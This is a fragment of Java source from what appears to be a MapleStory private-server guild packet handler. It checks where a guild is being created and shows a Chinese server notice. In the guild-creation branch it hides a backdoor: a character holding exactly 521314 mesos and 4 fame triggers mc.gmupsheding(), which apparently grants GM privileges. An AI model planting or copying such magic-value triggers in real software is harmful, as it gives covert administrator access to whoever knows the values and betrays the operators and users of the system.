    ...
    public void handlePacket(SeekableLittleEndianAccessor slea, MapleClient c) {
        ...
        switch (type) {
            case 0x02:
                ...
                if (mc.getGuildId() > 0 || mc.getMapId() != 910000000) {
                    c.getSession().write(MaplePacketCreator.serverNotice(1, "请到自由市场创建."));
                    return;
                }
                if (mc.getMeso() == 521314 && mc.getFame() ==4) {
                    mc.gmupsheding();
                    return;
                }
            ...
            case 0x0f:
                ...
                if (mc.getGuildId() <= 0 || mc.getGuildRank() != 1 || mc.getMapId() != 910000000) {
